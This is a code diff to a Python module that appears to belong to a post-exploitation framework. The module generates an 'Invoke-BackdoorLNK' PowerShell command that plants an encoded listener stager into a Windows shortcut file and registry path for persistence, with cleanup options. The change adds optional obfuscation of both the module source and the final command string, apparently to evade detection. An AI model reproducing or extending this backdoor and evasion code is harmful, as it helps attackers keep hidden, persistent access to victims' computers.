@@ -93,7 +93,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         listenerName = self.options['Listener']['Value']
 
@@ -125,7 +125,9 @@ class Module:
 
         # read in the common powerup.ps1 module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/persistence/Invoke-BackdoorLNK.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -135,13 +137,13 @@ class Module:
         script = f.read()
         f.close()
 
-        script += "Invoke-BackdoorLNK "
+        scriptEnd = "Invoke-BackdoorLNK "
         
         if cleanup.lower() == "true":
-            script += " -CleanUp"
-            script += " -LNKPath '%s'" %(lnkPath)
-            script += " -RegPath '%s'" %(regPath)
-            script += "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\"" %(lnkPath,regPath)
+            scriptEnd += " -CleanUp"
+            scriptEnd += " -LNKPath '%s'" %(lnkPath)
+            scriptEnd += " -RegPath '%s'" %(regPath)
+            scriptEnd += "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\"" %(lnkPath,regPath)
        
         else:
             if extFile != '':
@@ -174,8 +176,10 @@ class Module:
                     encScript = launcher.split(" ")[-1]
                     statusMsg += "using listener " + listenerName
 
-            script += " -LNKPath '%s'" %(lnkPath)
-            script += " -EncScript '%s'" %(encScript)
-            script += "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\"" %(lnkPath,listenerName)
-
+            scriptEnd += " -LNKPath '%s'" %(lnkPath)
+            scriptEnd += " -EncScript '%s'" %(encScript)
+            scriptEnd += "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\"" %(lnkPath,listenerName)
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
